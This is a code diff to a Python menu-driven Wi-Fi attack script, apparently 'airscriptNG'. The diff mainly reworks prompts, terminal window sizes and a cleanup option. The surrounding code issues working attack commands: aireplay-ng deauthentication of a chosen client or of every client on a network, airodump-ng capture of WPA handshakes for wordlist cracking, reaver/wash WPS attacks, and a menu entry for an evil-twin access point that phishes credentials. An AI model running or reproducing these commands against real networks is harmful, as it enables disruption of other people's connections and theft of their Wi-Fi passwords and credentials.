@@ -832,7 +832,8 @@ def check_depends(): #Still works
     #        depandancies()
 def clearScreen(): #This is fine too but devise not defined fix
     import os
-    if input("\033[1;34;48m[i] \033[1;37;48mPress 'y' to perform cleanup! >>").lower().startswith("y"):
+    dcl = input("\033[1;34;48m[i] \033[1;37;48mPress 'y' to perform cleanup or 'clear' to clean out residual files >>")
+    if dcl.lower().startswith("y"):
         print("\n\033[1;34;48m[info] \033[0;37;48mWait a few seconds, cleaning up...")
         os.system("sudo ip link set %s down && sudo iw dev %s set type managed && sudo ip link set %s up" %(index, index, index))
         os.system("sudo systemctl start NetworkManager.service")
@@ -845,6 +846,15 @@ def clearScreen(): #This is fine too but devise not defined fix
             os.system("clear")
             title()
             os.system("rm log.txt 2>/dev/null")
+    if dcl.lower().startswith("clear"):
+        os.system("rm ~/.airscriptNG/ -rf 2>/dev/null >/dev/null")
+        input("\n\nDone. Hit enter ~# ")
+        print("\n\033[1;34;48m[info] \033[0;37;48mWait a few seconds, cleaning up...")
+        os.system("sudo ip link set %s down && sudo iw dev %s set type managed && sudo ip link set %s up" %(index, index, index))
+        os.system("sudo systemctl start NetworkManager.service")
+        os.system("sudo systemctl start wpa_supplicant.service")
+        os.system("clear")
+        title()
     else:
         clearScreen()
 def revert(): #revert repos is fine until apt-add solution is devised
@@ -912,7 +922,7 @@ def reaver():  #Needs major overhaul
             print("\033[1;32;48m[-] \033[0;37;48m5% done")
             reaverspecialdeps()
             #check_depends()
-            print("\033[1;33;48m[-] \033[0;35;48mAll dependancies are met ma dude. Make sure you have correct drivers! \033[0;37;48m")
+            print("\033[1;33;48m[-] \033[0;35;48mAll dependancies are met. Make sure you have correct drivers! \033[0;37;48m")
             time.sleep(1)
             os.system('clear')
             print("""\033[0;36;48m
@@ -942,7 +952,7 @@ def reaver():  #Needs major overhaul
             z = input("\033[0;34;48m\nGot all that? Press enter >>")
             z = str(z)
             os.system("wash -i %s" %(index))
-            b = input("\n\033[1;33;48m[?] \033[0;34;48mJust copy+paste the bssid of the target network [no spaces]>> ")
+            b = input("\n\033[1;33;48m[?] \033[0;34;48mJust copy+paste the bssid of the target network [no spaces] >> ")
             b = str(b)
             c = input("\033[1;34;48m[?] \033[1;35;48mFinally tell me the channel of the target ap [look for Ch] >> ")
             c = str(c)
@@ -987,7 +997,7 @@ def aircrackng(): #Lots of effort needed
     import os,time
     print("\033[1;33;48m[-] \033[0;37;48mChecking for dependancies")
     check_depends()
-    print("\033[1;33;48m[-] \033[0;35;48mAll dependancies are met ma dude. Make sure you have correct drivers! \033[0;37;48m")
+    print("\033[1;33;48m[-] \033[0;35;48mAll dependancies are met. Make sure you have correct drivers! \033[0;37;48m")
     time.sleep(1)		
     os.system("clear")
     while True:
@@ -1044,7 +1054,7 @@ def aircrackng(): #Lots of effort needed
                         print("\033[1;32;48m[info] \033[1;36;48mWe need a wordlist. You can download one from here: https://goo.gl/3UoZ34")
                         #print("\033[1;34;48m[info] \033[0;34;48mPlease download or locate one ")
                         #print("\033[1;36;48m[info] \033[0;33;48mHopefully the password will be in there or put it in there")
-                        input("\n\033[1;32;48m[+] \033[0;39;48mPlease Specify wordlist. Press \033[1;32;48m[enter]\033[0;37;48m to open file selection \033[1;31;48m ~# \033[0;39;48m")
+                        input("\n\033[1;32;48m[+] \033[1;31;48mPlease Specify wordlist. Press \033[1;32;48m[enter]\033[1;31;48m to open file selection \033[1;31;48m ~# \033[0;39;48m")
                         def wordlist():
                             from tkinter.filedialog import Tk
                             from tkinter.filedialog import askopenfilename
@@ -1070,7 +1080,7 @@ def aircrackng(): #Lots of effort needed
                         stda = input("\n\033[1;39;48mPlease enter a number. Around 3-5 is sufficient for a good WiFi-card.\033[1;31;48m ~# \033[0;39;48m")
                         input("\n\033[1;33;48m[?] \033[1;37;48mONCE YOU SEE WPA HANDSHAKE:%s AT THE TOP RIGHT PRESS CTRL+C. \n\n[PRESS ENTER] \033[1;31;48m ~# \033[0;39;48m" %(d))
                         os.system("iwconfig %s channel %s" %(index,c))
-                        os.system("xterm -geometry 100x30+4320 -title 'DEAUTHING: %s & CAPTURING'  $TOPLEFTBIG -bg '#FFFFFF' -fg '#000000' $TOPLEFTBIG -bg '#FFFFFF' -fg '#000000' $TOPLEFTBIG -bg '#FFFFFF' -fg '#000000' -e 'aireplay-ng -0 %s -a %s -c %s %s --ignore-negative-one && airodump-ng -w HANDSHAKES/%s -c %s --bssid %s --ignore-negative-one %s'" %(g,stda,d,g,index,b,c,d,index))
+                        os.system("xterm -geometry 100x25+4320+7640 -title 'DEAUTHING: %s & CAPTURING'  $TOPLEFTBIG -bg '#FFFFFF' -fg '#000000' $TOPLEFTBIG -bg '#FFFFFF' -fg '#000000' $TOPLEFTBIG -bg '#FFFFFF' -fg '#000000' -e 'aireplay-ng -0 %s -a %s -c %s %s --ignore-negative-one && airodump-ng -w HANDSHAKES/%s -c %s --bssid %s --ignore-negative-one %s'" %(g,stda,d,g,index,b,c,d,index))
                         post_frame()
                     def broadcast_deauth():
                         os.system('clear')
@@ -1079,7 +1089,7 @@ def aircrackng(): #Lots of effort needed
                         brda = input("\n\033[1;39;48mPlease enter a number. Around 3-5 is sufficient for a good WiFi-card.\033[1;31;48m ~# \033[0;39;48m")
                         input("\n\033[1;33;48m[?] \033[1;39;48mONCE YOU SEE WPA HANDSHAKE:%s AT THE TOP RIGHT PRESS CTRL+C. \n\n[PRESS ENTER] \033[1;31;48m ~# \033[0;39;48m" %(d))
                         os.system("iwconfig %s channel %s" %(index,c))
-                        os.system("xterm -geometry 100x30+4320 -title 'DEAUTHING ALL & CAPTURING'  $TOPLEFTBIG -bg '#FFFFFF' -fg '#000000' $TOPLEFTBIG -bg '#FFFFFF' -fg '#000000' $TOPLEFTBIG -bg '#FFFFFF' -fg '#000000' -e 'aireplay-ng -0 %s -a %s %s --ignore-negative-one && airodump-ng -w HANDSHAKES/%s -c %s --bssid %s --ignore-negative-one %s'" %(brda,d,index,b,c,d,index))
+                        os.system("xterm -geometry 100x25+4320+7640 -title 'DEAUTHING ALL & CAPTURING'  $TOPLEFTBIG -bg '#FFFFFF' -fg '#000000' $TOPLEFTBIG -bg '#FFFFFF' -fg '#000000' $TOPLEFTBIG -bg '#FFFFFF' -fg '#000000' -e 'aireplay-ng -0 %s -a %s %s --ignore-negative-one && airodump-ng -w HANDSHAKES/%s -c %s --bssid %s --ignore-negative-one %s'" %(brda,d,index,b,c,d,index))
                         post_frame()
                     def no_deauth():
                         os.system('clear')
@@ -1087,10 +1097,10 @@ def aircrackng(): #Lots of effort needed
                         print("\033[1;33;48m[info] \033[1;39;48mYou need to wait for someone to connect.")
                         input("\n\033[1;36;48m[info] \033[0;33;48mREADY? HIT \033[1;32;48m[ENTER]\033[0;33;48m TO RUN. ONCE YOU SEE WPA HANDSHAKE:%s AT THE TOP RIGHT PRESS CTRL+C.\033[1;31;48m ~# \033[0;39;48m" %(d))
                         os.system("\niwconfig %s channel %s" %(index,c))
-                        os.system("xterm -geometry 100x30+4320 -title 'WAITING FOR HANDSHAKE' -bg '#FFFFFF' -fg '#000000' -e 'airodump-ng -w HANDSHAKES/%s -c %s --bssid %s --ignore-negative-one %s'" %(b,c,d,index))
+                        os.system("xterm -geometry 100x25+4320+7640 -title 'WAITING FOR HANDSHAKE' -bg '#FFFFFF' -fg '#000000' -e 'airodump-ng -w HANDSHAKES/%s -c %s --bssid %s --ignore-negative-one %s'" %(b,c,d,index))
                         post_frame()
                     def sta():
-                        os.system("xterm -title 'COPY/PASTE: HIGHLIGHT & CLICK SCROLL WHEEL OR LB+RB' -geometry 110x30+4320+7640 -bg '#FFFFFF' -fg '#000000' -e 'airodump-ng --bssid %s -c %s --ignore-negative-one %s' &" %(d,c,index))
+                        os.system("xterm -title 'COPY/PASTE: HIGHLIGHT & CLICK SCROLL WHEEL OR LB+RB' -geometry 90x20+4320+7640 -bg '#FFFFFF' -fg '#000000' -e 'airodump-ng --bssid %s -c %s --ignore-negative-one %s' &" %(d,c,index))
                         global g
                         print("\n\033[0;37;48m[info] \033[1;33;48mIn the \033[1;32;48mXTERM\033[1;33;48m at the bottom right, look at the column where it says bssid/station.")
                         #print("\033[1;35;48m[info] \033[1;37;48mIf you don't have that then leave you'll have to de-auth everyone or not de-auth by leaving it blank.")
@@ -1126,7 +1136,7 @@ def aircrackng(): #Lots of effort needed
             os.system("sudo systemctl start NetworkManager.service")
             os.system("sudo systemctl start wpa_supplicant.service")
             os.system("clear")
-            if input("\n\033[1;37;48m[-] \033[1;38;48mPress \033[1;32;48m[y]\033[1;39;48m to exit or any other key to return to start \033[1;31;48m ~# \033[0;39;48m").lower().startswith("y"):
+            if input("\n\033[1;37;48m[-] \033[1;39;48mPress \033[1;32;48m[y]\033[1;39;48m to exit or any other key to return to start \033[1;31;48m ~# \033[0;39;48m").lower().startswith("y"):
                 os.system("rm log.txt 2>/dev/null")
                 os._exit(1)
             else:
@@ -1151,8 +1161,7 @@ def title(): #Works so far
         print("\033[1;35;48mType [8] - Setup Hashcat and drivers to use GPU for cracking")
         print("\033[1;30;48mType [9] - Host a Evil-Twin/MITM AP to phish credentials, sniff traffic and more.")
         print("\033[1;37;48mType [10] - Crack an existing WPA/WPA2 handshake using CPU/GPU.")
-        print("\n\n\033[1;37;40mType [98] - Clean out any residual files, fixes option [2] not working. ")
-        print("\033[1;37;40mType [99] - Exit ")
+        print("\n\n\033[1;37;40mType [99] - Exit ")
         selection = input("\033[0;39;48m\n|MENU|(Press 1, 2, 3, 4, 5, 6 or 7) >>")
         if selection == "1":
             aircrackng()
@@ -1214,10 +1223,10 @@ def title(): #Works so far
             mitm_fakeap_func()
         elif selection == "10":
             handshake_func()
-        elif selection == "98":
-            os.system("rm ~/.airscriptNG/ -rf 2>/dev/null >/dev/null")
-            input("\n\nDone. Hit enter ~# ")
-            title()
+        #elif selection == "98":
+        #    os.system("rm ~/.airscriptNG/ -rf 2>/dev/null >/dev/null")
+        #    input("\n\nDone. Hit enter ~# ")
+        #    title()
         else: 
             os.system('clear')
             title()
